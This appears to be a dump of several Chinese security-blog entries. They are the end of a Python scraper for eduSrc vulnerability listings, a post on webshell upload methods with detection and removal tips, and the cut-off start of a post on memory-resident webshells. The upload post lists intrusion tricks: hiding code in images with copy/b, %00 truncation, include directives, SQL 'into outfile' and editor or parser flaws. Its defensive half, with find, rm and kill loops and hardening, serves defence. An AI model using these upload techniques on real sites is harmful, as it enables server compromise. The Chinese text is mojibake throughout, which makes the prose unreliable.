class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            province_id = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥é«˜æ ¡æ‰€åœ¨åŒºåŸŸ/çœä»½å¯¹åº”ç¼–å·ï¼š&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> province_id &lt; <span class="number">0</span> <span class="keyword">or</span> province_id &gt;= <span class="built_in">len</span>(provinceList):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;%sè¾“å…¥è¶…å‡ºé™åˆ¶ï¼%s&#x27;</span>%(red, end))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n%sã€%sã€‘ &gt;&gt;%s å°†æŸ¥æ‰¾çš„é«˜æ ¡åï¼š&quot;</span>%(green, provinceList[province_id], end), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    college_name = <span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    numEnd = get_numEnd(choice, province_id)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(numStart, numEnd+<span class="number">1</span>)):</span><br><span class="line">        search_url = url + <span class="string">&#x27;?province=%s&amp;page=%s&#x27;</span> % (province_id, i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            ress = requests.get(url=search_url, headers=headers)</span><br><span class="line">            data_html = etree.HTML(ress.text)</span><br><span class="line">            schoolNameList = data_html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/table/tr[*]/td[2]/a/text()&#x27;</span>)</span><br><span class="line">            bugNumList = data_html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/table/tr[@class=&quot;row&quot;]/td[3]/text()&#x27;</span>)</span><br><span class="line">            bugThreatList = data_html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/table/tr[@class=&quot;row&quot;]/td[4]/text()&#x27;</span>)</span><br><span class="line">            <span class="comment"># print(schoolNameList[1].strip(), len(schoolNameList))</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(schoolNameList)):</span><br><span class="line">                schoolName = schoolNameList[j].strip()  <span class="comment"># å»å‰åç©ºæ ¼</span></span><br><span class="line">                <span class="keyword">if</span> schoolName == college_name:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;%sã€+ã€‘ç›®æ ‡ã€%sã€‘åœ¨ã€%sã€‘åˆ—è¡¨ä¸­ç¬¬ %s é¡µ, ç¬¬ %s ä¸ªï¼Œidä¸º%sï¼Œæ¼æ´æ€»æ•°ä¸º%sï¼Œæ¼æ´å¨èƒå€¼ä¸º%s%s\n&#x27;</span></span><br><span class="line">                        % (green, college_name, provinceList[province_id], i, j+<span class="number">1</span>, (i-<span class="number">1</span>)*<span class="number">15</span>+(j+<span class="number">1</span>), bugNumList[j], bugThreatList[j], end))</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag != <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%sã€*ã€‘æŸ¥è¯¢ä¸åˆ°è¯¥é«˜æ ¡ä¿¡æ¯ï¼Œå¯èƒ½æ˜¯é«˜æ ¡åé”™è¯¯æˆ–æš‚æœªæ”¶å½•%s\n&#x27;</span> % (red, end))</span><br></pre></td></tr></table></figure><h1>æœ€å</h1><p>è¿™ä¸ªè„šæœ¬æ˜¯<code>ä¸€æ—¶å…´èµ·</code>å†™çš„ï¼Œå¾ˆå¤šæƒ…å†µå¯èƒ½æ²¡æœ‰è€ƒè™‘åˆ°ï¼Œä½†æ€»ä½“æ•ˆæœè¾¾åˆ°æˆ‘çš„<code>é¢„æœŸ</code>äº†ã€‚<br>å…¶ä»–å°çš„è‡ªå®šä¹‰å‡½æ•°è¿™é‡Œå°±ä¸è´´äº†ï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚<br>å¦‚æœå¯¹æœç´¢é€Ÿåº¦æœ‰è¦æ±‚çš„å°ä¼™ä¼´å¯ä»¥å°è¯•åŠ ç‚¹<code>çº¿ç¨‹</code>æé«˜é€Ÿåº¦ã€‚</p><div class="note success flat"><p>æ„Ÿå…´è¶£çš„å°ä¼™ä¼´å¯ä»¥è‡ªè¡Œå»githubä¸­ <a href="https://github.com/ZekerTop/EduSrc">æŸ¥çœ‹å®Œæ•´æºç </a></p></div>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> çˆ¬è™« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> eduSrc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShellï¼ˆ3ï¼‰| æœ¨é©¬ä¸Šä¼ æ–¹å¼åŠæŸ¥æ€é˜²èŒƒ</title>
      <link href="/posts/77d4ef29/"/>
      <url>/posts/77d4ef29/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>æœ¨é©¬ä¸Šä¼ æ–¹å¼</h1><h2 id="ç›´æ¥ä¸Šä¼ ">ç›´æ¥ä¸Šä¼ </h2><p>é€šè¿‡ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è·å–webShellã€‚</p><h2 id="æ•°æ®åº“å¤‡ä»½webShell">æ•°æ®åº“å¤‡ä»½webShell</h2><p>ç½‘ç«™è¿›åˆ¶ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä¸Šä¼ æ­£å¸¸çš„<code>å›¾ç‰‡é©¬</code>ï¼Œç„¶åé€šè¿‡æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ä¿®æ”¹å¤‡ä»½åçš„æ–‡ä»¶åï¼Œä½¿å¾—<code>å›¾ç‰‡é©¬</code>èƒ½å¤ŸæˆåŠŸè§£ææ‰§è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy/b 1.jpg+1.txt 2.jpg   # å°†æ–‡ä»¶å†™å…¥å›¾ç‰‡ä¸­ï¼Œè¿™é‡Œçš„æ–‡ä»¶ä¸å±€é™äºtxtæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>æœ‰æ—¶å€™æ•°æ®åº“å¤‡ä»½åŠŸèƒ½å¯¹å¤‡ä»½çš„åœ°å€åšäº†å‰ç«¯çš„é™åˆ¶ï¼Œåªéœ€ä¿®æ”¹å‰ç«¯æºç ï¼ŒæˆåŠŸç»•è¿‡ã€‚</p><h2 id="çªç ´æœ¬åœ°jséªŒè¯webShell">çªç ´æœ¬åœ°jséªŒè¯webShell</h2><p>è‹¥ç½‘ç«™å¯¹ä¸Šä¼ åªåšäº†å‰ç«¯é™åˆ¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å‰ç«¯ä»£ç æˆ–è€…åˆ é™¤æ£€æµ‹ä»£ç ï¼Œè¿˜å¯ä»¥é€šè¿‡æŠ“åŒ…æ”¹åŒ…æˆåŠŸä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€‚</p><h2 id="ä¸Šä¼ å…¶ä»–è„šæœ¬webShell">ä¸Šä¼ å…¶ä»–è„šæœ¬webShell</h2><p>æœ‰æ—¶å€™ä¸€å°æœåŠ¡å™¨ä¸Šç”±äºæ­å»ºäº†ä¸åŒè„šæœ¬çš„å‡ ä¸ªç½‘ç«™ï¼Œå¯¼è‡´æœåŠ¡å¯åŒæ—¶æ‰§è¡Œå¤šç§è„šæœ¬ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å°è¯•ä¸Šä¼ å…¶ä»–è„šæœ¬æ¥ç»•è¿‡å¯¹æŸä¸€è„šæœ¬çš„é™åˆ¶ã€‚</p><h2 id="00æˆªæ–­webShell">00æˆªæ–­webShell</h2><p>00æˆªæ–­æ˜¯åˆ©ç”¨æœåŠ¡å™¨å¯¹%00åé¢çš„å­—ç¬¦ä¸å†è¯†åˆ«ï¼Œå¯¼è‡´æ”»å‡»è€…å¯æ„é€ <code>%00</code>ä¹‹å‰çš„åç¼€åä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼ŒæˆåŠŸç»•è¿‡<code>ç™½åå•é™åˆ¶</code>ã€‚</p><h2 id="è§£ææ¼æ´webShell">è§£ææ¼æ´webShell</h2><p>åˆ©ç”¨ä¸åŒæœåŠ¡å™¨å­˜åœ¨çš„è§£ææ¼æ´æˆåŠŸç»•è¿‡åç¼€åé™åˆ¶ä¸Šä¼ ã€‚å¦‚<code>IIS</code>ã€<code>apache</code>ã€<code>nginx</code>ç­‰</p><h2 id="åˆ©ç”¨ç¼–è¾‘å™¨æ¼æ´webShell">åˆ©ç”¨ç¼–è¾‘å™¨æ¼æ´webShell</h2><p>æœ‰äº›ç½‘ç«™åœ¨ç¼–è¾‘ç•Œé¢åº”ç”¨äº†å­˜åœ¨å·²çŸ¥æ¼æ´çš„ç¼–è¾‘å™¨ï¼Œå¯åˆ©ç”¨æ¼æ´ç›´æ¥getShellï¼Œæˆ–è€…é…åˆè§£ææ¼æ´ä¸Šä¼ æœ¨é©¬getShellã€‚å¦‚<code>fckeditor</code>ã€<code>ewebeditor</code>ã€<code>cheditor</code>ç­‰</p><h2 id="ç½‘ç«™é…ç½®æ’é©¬webShell">ç½‘ç«™é…ç½®æ’é©¬webShell</h2><p>ä¸€äº›ç½‘ç«™åœ¨åå°å­˜åœ¨ç½‘ç«™é…ç½®ï¼Œæ¯”å¦‚é…ç½®ç½‘ç«™é¦–é¡µå…¬å¸åç§°ç­‰ä¿¡æ¯ï¼Œæ­¤å¤„å¯ç›´æ¥æ’å…¥ä¸€å¥è¯æœ¨é©¬ã€‚é…ç½®ç•Œé¢æ’é©¬è¦éå¸¸å°å¿ƒï¼Œæœ€å¥½ä¸‹è½½æºç ï¼Œåˆ†ææºç é—­åˆä»£ç æ’å…¥ä¸€å¥è¯ï¼Œé˜²æ­¢ç½‘ç«™è¢«æ’åºŸã€‚</p><h2 id="é€šè¿‡ç¼–è¾‘æ¨¡æ¿webShell">é€šè¿‡ç¼–è¾‘æ¨¡æ¿webShell</h2><p>é€šè¿‡å¯¹ç½‘ç«™çš„æ¨¡æ¿ç¼–è¾‘å†™å…¥ä¸€å¥æ¢ï¼Œåˆ©ç”¨è§£ææ¼æ´ç”Ÿæˆè„šæœ¬getShell</p><p>è¿˜å¯ä»¥å°†ä¸€å¥æ¢æœ¨é©¬æ‰“åŒ…ä¸ºå‹ç¼©æ–‡ä»¶ï¼Œä¸Šä¼ åè§£å‹åˆ°ç½‘ç«™æˆåŠŸgetShell</p><h2 id="ä¿®æ”¹è„šæœ¬æ–‡ä»¶ç›´æ¥getShell">ä¿®æ”¹è„šæœ¬æ–‡ä»¶ç›´æ¥getShell</h2><p>æœ‰çš„ç½‘ç«™ç®¡ç†å‘˜å¯ä»¥ä¿®æ”¹è„šæœ¬ï¼Œæ”»å‡»è€…å¯åœ¨è„šæœ¬ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬æˆåŠŸgetShell</p><h2 id="æ•°æ®åº“å‘½ä»¤æ‰§è¡ŒwebShell">æ•°æ®åº“å‘½ä»¤æ‰§è¡ŒwebShell</h2><p>æœ‰çš„ç½‘ç«™ç®¡ç†å‘˜å¯ç›´æ¥åœ¨å‰ç«¯æ‰§è¡Œsqlè¯­å¥ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºæ•°æ®åº“å†™å…¥ä¸€å¥è¯ï¼Œå†å°†ä¸€å¥è¯å¯¼å‡ºåˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œè¿æ¥getShell</p><h2 id="æ–‡ä»¶åŒ…å«webShell">æ–‡ä»¶åŒ…å«webShell</h2><p>å½“é˜²ç«å¢™å¯¹å¯æ‰§è¡Œè„šæœ¬è¿‡æ»¤æ¯”è¾ƒä¸¥æ ¼æ—¶ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«çš„æ–¹å¼ç»•è¿‡ã€‚</p><p>é¦–å…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡é©¬ï¼ˆåç¼€ä¸ºjpg/pngç­‰ç½‘ç«™å…è®¸ä¸Šä¼ çš„æ ¼å¼ï¼‰ï¼Œç„¶åä¸Šä¼ åŒ…å«å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶åŒ…å«è¿›å»ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include( &quot;xxx.jpg&quot;);?&gt;       # php</span><br><span class="line">&lt;!--#include file=&quot;xxx.jpg&quot;--&gt;     # asp</span><br></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ‰§è¡ŒwebShell">å‘½ä»¤æ‰§è¡ŒwebShell</h2><p>ç½‘ç«™å­˜åœ¨å¯æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹å¯ç›´æ¥ç”¨<code>echo</code>å‡½æ•°å†™å…¥ä¸€å¥ã€‚</p><h2 id="Sqlæ³¨å…¥webShell">Sqlæ³¨å…¥webShell</h2><p>å­˜åœ¨sqlæ³¨å…¥çš„ç½‘ç«™ï¼Œå¦‚æœæœ‰è¶³å¤Ÿçš„æƒé™å¹¶ä¸”å¯ä»¥å¾—åˆ°ç»å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨<code>select into......outfile</code>å‡½æ•°ç›´æ¥å†™å…¥ä¸€å¥è¯åˆ°ç½‘ç«™æ ¹ç›®å½•ã€‚</p><h1>æœ¨é©¬æŸ¥æ€é˜²èŒƒ</h1><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>é’ˆå¯¹ä¸€å¥è¯æœ¨é©¬</span></div>    <div class="hide-content"><ol><li><p>æ—¥å¿—æ’æŸ¥<br>é’ˆå¯¹Webshellæ­£åœ¨ä½¿ç”¨çš„å¸¸è§å…³é”®å­—è¿‡æ»¤æœåŠ¡å™¨è®¿é—®å’Œé”™è¯¯æ—¥å¿—ï¼ŒåŒ…æ‹¬æ–‡ä»¶åç§°å’Œ/æˆ–å‚æ•°åç§°ã€‚<br>æ ¹æ®ä¸‹é¢çš„ç¤ºä¾‹ï¼Œåœ¨Apache HTTP Serverè®¿é—®æ—¥å¿—ä¸­çš„URLä¸­æœç´¢å­—ç¬¦ä¸²æ–‡ä»¶ã€‚<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/1.492nhtavxti0.jpg" alt="1.png"></p></li><li><p>æ–‡ä»¶ç³»ç»Ÿæœç´¢<br>æ–‡ä»¶ç³»ç»Ÿï¼ˆé€šå¸¸æ˜¯WebæœåŠ¡å™¨æ ¹ç›®å½•ï¼‰ä¸­æœç´¢æ–‡ä»¶æˆ–æ–‡ä»¶åä¸­çš„é€šç”¨å­—ç¬¦ä¸²ã€‚<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/2.3u5j4t9b79i0.jpg" alt="2.png"><br>å¦‚æœæœç´¢åˆ°å¾ˆé•¿çš„å­—ç¬¦ä¸²ï¼Œè¿™å¯èƒ½è¡¨ç¤ºå·²è¿›è¡Œäº†ç¼–ç ã€‚ä¸€äº›åé—¨ç¨‹åºå…·æœ‰æ•°åƒè¡Œä»£ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/3.570zga084ek0.jpg" alt="3.png"></p></li><li><p>æœç´¢æœ€è¿‘Xå¤©ä¿®æ”¹è¿‡çš„æ–‡ä»¶<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡æœç´¢äº†å‰ä¸€å¤©æˆ–å‰ä¸€å°æ—¶æ›´æ”¹çš„*.phpæ–‡ä»¶æ¥è¿›è¡Œæ’æŸ¥</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.php -mtime -1 -ls    # æœç´¢å‰ä¸€å¤©</span><br><span class="line">find / -name *.php -mmin -60 -ls    # æœç´¢å‰ä¸€å°æ—¶</span><br></pre></td></tr></table></figure><p>ä½†å»ºè®®æœç´¢æ‰€æœ‰æ›´æ”¹è¿‡çš„æ–‡ä»¶ï¼Œæ¯•ç«ŸwebShellä¹Ÿå¯ä»¥åµŒå…¥åˆ°å›¾åƒæˆ–ä»»ä½•å…¶ä»–æ–‡ä»¶ä¸­ã€‚</p></li><li><p>.htaccessæ–‡ä»¶çš„åˆ†æ<br>åˆ†æ<code>.htaccess</code>æ–‡ä»¶æ˜¯å¦è¿›è¡Œäº†ä¿®æ”¹ã€‚ä»¥ä¸‹æ˜¯æ”»å‡»è€…å¯èƒ½å¯¹.htaccessæ–‡ä»¶è¿›è¡Œæ›´æ”¹çš„ç¤ºä¾‹<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/4.4qjxp5zgmzs0.jpg" alt="4.png"></p></li><li><p>ç›‘æ§å¼‚å¸¸æµé‡<br>ç›‘è§†ç½‘ç»œä¸­å­˜åœ¨å¼‚å¸¸çš„ç½‘ç»œæµé‡å’Œè¿æ¥ã€‚<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/5.2gnmmeyy4x34.jpg" alt="5.png"></p></li><li><p>å€ŸåŠ©è½¯ä»¶æŸ¥æ€<br>ä¸‹è½½ç½‘ç«™æºç è‡³æœ¬åœ°ï¼Œé€šè¿‡<code>Dç›¾</code>ã€<code>Seayæºä»£ç å®¡è®¡ç³»ç»Ÿ</code>ç­‰è½¯ä»¶è¿›è¡ŒæŸ¥æ€</p></li></ol></div></div><div class="hide-toggle" style="border: 1px solid  #fff8e9"><div class="hide-button toggle-title" style="background-color:  #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>é’ˆå¯¹å†…å­˜é©¬ï¼ˆä¸æ­»é©¬ï¼‰</span></div>    <div class="hide-content"><p>ç”±äºå†…å­˜é©¬ï¼Œå³ä¸æ­»é©¬ï¼Œå…·æœ‰æ— æ–‡ä»¶è½åœ°ã€æéš¾æ£€æµ‹å’Œå‘ç°ç­‰ç‰¹æ€§ï¼Œéš¾ä»¥æ¸…é™¤ã€‚<br>é’ˆå¯¹ä¸æ­»é©¬ï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹æ–¹æ³•å¯ä»¥è¿›è¡Œæ£€æµ‹</p><ol><li><p>é‡å¯æœåŠ¡å™¨<br>ç®€å•ç²—æš´ï¼Œé‡å¯æœåŠ¡å™¨ï¼Œç„¶ååˆ é™¤æœ¨é©¬æ–‡ä»¶ã€‚ä½†å¤§å¤šæ•°awdæ¯”èµ›ä¼šå› ä¸º<code>é‡å¯å¤±åˆ†</code>ï¼Œæ‰€ä»¥ä¸èƒ½é¢‘ç¹é‡å¯æœåŠ¡ã€‚</p></li><li><p>æ—¥å¿—çš„æ’æŸ¥<br>åœ¨ä¸Šé¢çš„ä¸€å¥è¯æœ¨é©¬çš„æ£€æµ‹æ’æŸ¥çš„åŸºç¡€ä¸Šï¼Œé‡ç‚¹å…³æ³¨ä¸€äº›<code>ä¸æ˜è·¯å¾„</code>ä»¥åŠå®ƒçš„<code>å‡ºç°é¢‘ç‡</code>ï¼Œå¯é€šè¿‡æ­¤æŸ¥çœ‹å…¶æœ¨é©¬æ–‡ä»¶åã€‚</p></li><li><p>é‡å†™æœ¨é©¬æ–‡ä»¶<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸æ–­å‘æœ¨é©¬æ–‡ä»¶é‡å†™æ¥å…‹åˆ¶ï¼Œå‰ææ˜¯å†™å…¥é€Ÿåº¦è¦<code>å¤§äº</code>ä¸æ­»é©¬çš„ç”Ÿæˆé€Ÿåº¦ï¼Œä¸”å·²çŸ¥<code>æœ¨é©¬æ–‡ä»¶å</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     set_time_limit(<span class="number">0</span>);</span><br><span class="line">     ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">     unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">     <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">         file_put_contents(<span class="string">&#x27;./shell.php&#x27;</span>,<span class="string">&#x27;11111&#x27;</span>);</span><br><span class="line">         usleep(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>bashè„šæœ¬åˆ é™¤<br>é€šè¿‡ç¼–å†™bashè„šæœ¬ä¸æ–­çš„è¿›è¡Œåˆ é™¤æœ¨é©¬æ–‡ä»¶ï¼Œå‰ææ˜¯å·²çŸ¥<code>æœ¨é©¬æ–‡ä»¶å</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> : ;<span class="keyword">do</span> rm -rf .shell.php; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></li><li><p>æ¸…é™¤è¿›ç¨‹<br>ä¸æ–­åœ°åˆ é™¤ç¨‹åºä»¥åŠæ€æ­»è¿›ç¨‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">         <span class="variable">$pid</span>=xxx;                   <span class="comment"># è¿›ç¨‹å·</span></span><br><span class="line">         @unlink(<span class="string">&#x27;shell.php&#x27;</span>); </span><br><span class="line">         exec(<span class="string">&#x27;kill -9 $pid&#x27;</span>);       <span class="comment"># å¼ºåˆ¶æ¸…é™¤è¿›ç¨‹</span></span><br><span class="line">         usleep(<span class="number">1000</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></div></div><h1>é¢„é˜²æªæ–½</h1><p>é€šå¸¸ï¼Œé»‘å®¢ä¼šåˆ©ç”¨WebæœåŠ¡å™¨è½¯ä»¶ä¸­å­˜åœ¨çš„æ¼æ´æ¥å®‰è£…webShellã€‚ å› æ­¤ï¼Œæ¶ˆé™¤è¿™äº›æ¼æ´å¯¹äºé¿å…å¤±é™·WebæœåŠ¡å™¨çš„æ½œåœ¨é£é™©å¾ˆé‡è¦ã€‚<br>ä»¥ä¸‹æ˜¯ä¸€äº›ä¸webShellç›¸å…³çš„é¢„é˜²æªæ–½ã€‚</p><ol><li><p>å¦‚æœä¸ä½¿ç”¨ï¼Œè¦ç¦ç”¨å±é™©çš„PHPå‡½æ•°ï¼Œä¾‹å¦‚<code>exec()</code>ã€<code>shell_exec()</code>ã€<code>passthru()</code>ã€<code>system()</code>ã€<code>show_source()</code>ã€<code>proc_open()</code>ã€<code>pcntl_exec()</code>ã€<code>eval()</code>ä¸<code>assert()</code>ã€‚</p></li><li><p>å¦‚æœå¿…é¡»è¦å¯ç”¨è¿™äº›å‘½ä»¤ï¼Œè¯·ç¡®ä¿æœªæˆæƒç”¨æˆ·æ— æ³•è®¿é—®è¿™äº›è„šæœ¬ã€‚æ­¤å¤–ï¼Œä½¿ç”¨<code>escapeshellarg()</code>å’Œ<code>escapeshellcmd()</code>å¯ä»¥ç¡®ä¿ä¸èƒ½å°†ç”¨æˆ·è¾“å…¥æ³¨å…¥åˆ°shellå‘½ä»¤ä¸­ï¼Œä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p></li><li><p>å¦‚æœWebåº”ç”¨ç¨‹åºæ­£åœ¨ä½¿ç”¨ä¸Šä¼ è¡¨å•ï¼Œè¯·ç¡®ä¿ä¸Šä¼ çš„è¡¨å•æ˜¯å®‰å…¨çš„ï¼Œå¹¶ä¸”ä»…å…è®¸ä¸Šä¼ <code>ç™½åå•</code>æ‰€å…è®¸çš„æ–‡ä»¶ç±»å‹ã€‚</p></li><li><p>ä¸è¦ç›¸ä¿¡ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯ã€‚</p></li><li><p>ä¸è¦ç›²ç›®ä½¿ç”¨åœ¨çº¿è®ºå›æˆ–ç½‘ç«™ä¸Šçš„ä»£ç ã€‚</p></li><li><p>å¯¹äº<code>WordPress</code>ï¼Œå¦‚æœä¸éœ€è¦ï¼Œè¦<code>é¿å…</code>å®‰è£…ç¬¬ä¸‰æ–¹æ’ä»¶ã€‚å¦‚æœéœ€è¦ä½¿ç”¨æ’ä»¶ï¼Œè¯·ç¡®ä¿æ’æ¥ä»¶å…¶ä¿¡èª‰è‰¯å¥½ä¸”ç»å¸¸æ›´æ–°ã€‚</p></li><li><p>åœ¨æ•æ„Ÿç›®å½•ï¼ˆå¦‚å›¾ç‰‡æˆ–ä¸Šä¼ ï¼‰ä¸­<code>ç¦ç”¨</code>PHPæ‰§è¡Œã€‚</p></li><li><p><code>é”å®š</code>WebæœåŠ¡å™¨ç”¨æˆ·æƒé™ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShellï¼ˆ2ï¼‰| å†…å­˜é©¬ï¼ˆä¸æ­»é©¬ï¼‰</title>
      <link href="/posts/8a6b0e5b/"/>
      <url>/posts/8a6b0e5b/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>ä»€ä¹ˆæ˜¯å†…å­˜é©¬</h1><p>å†…å­˜é©¬æ˜¯<code>æ— æ–‡ä»¶æ”»å‡»</code>çš„ä¸€ç§å¸¸ç”¨æ‰‹æ®µï¼Œéšç€æ”»é˜²æ¼”ç»ƒçƒ­åº¦è¶Šæ¥è¶Šé«˜ï¼šæ”»é˜²åŒæ–¹çš„åšå¼ˆï¼Œæµé‡åˆ†æã€EDRç­‰ä¸“ä¸šå®‰å…¨è®¾å¤‡è¢«è“æ–¹å¹¿æ³›ä½¿ç”¨ï¼Œä¼ ç»Ÿçš„æ–‡ä»¶ä¸Šä¼ çš„webShellæˆ–ä»¥æ–‡ä»¶å½¢å¼é©»ç•™çš„åé—¨è¶Šæ¥è¶Šå®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œå†…å­˜é©¬ä½¿ç”¨è¶Šæ¥è¶Šå¤šã€‚</p><p>webShellå†…å­˜é©¬ï¼Œæ˜¯åœ¨<code>å†…å­˜ä¸­</code>å†™å…¥æ¶æ„åé—¨å’Œæœ¨é©¬å¹¶æ‰§è¡Œï¼Œè¾¾åˆ°è¿œç¨‹æ§åˆ¶WebæœåŠ¡å™¨çš„ä¸€ç±»å†…å­˜é©¬ï¼Œå…¶ç„å‡†äº†ä¼ä¸šçš„<code>å¯¹å¤–çª—å£</code>ï¼šç½‘ç«™ã€åº”ç”¨ã€‚<br>ä½†ä¼ ç»Ÿçš„webShelléƒ½æ˜¯<code>åŸºäºæ–‡ä»¶ç±»å‹</code>çš„ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ä¸Šä¼ å·¥å…·æˆ–ç½‘ç«™æ¼æ´æ¤å…¥æœ¨é©¬ã€‚<br>è€Œå…¶ä¸­çš„åŒºåˆ«åœ¨äºwebShellå†…å­˜é©¬æ˜¯<code>æ— æ–‡ä»¶é©¬</code>ï¼Œåˆ©ç”¨<code>ä¸­é—´ä»¶</code>çš„<code>è¿›ç¨‹</code>æ‰§è¡ŒæŸäº›æ¶æ„ä»£ç ï¼Œä¸ä¼šæœ‰æ–‡ä»¶è½åœ°ï¼Œç»™æ£€æµ‹å¸¦æ¥å·¨å¤§éš¾åº¦ã€‚</p><div class="note info flat"><p>Javaå†…å­˜é©¬å¯å‚è€ƒæ–‡ç« â€”â€”<a 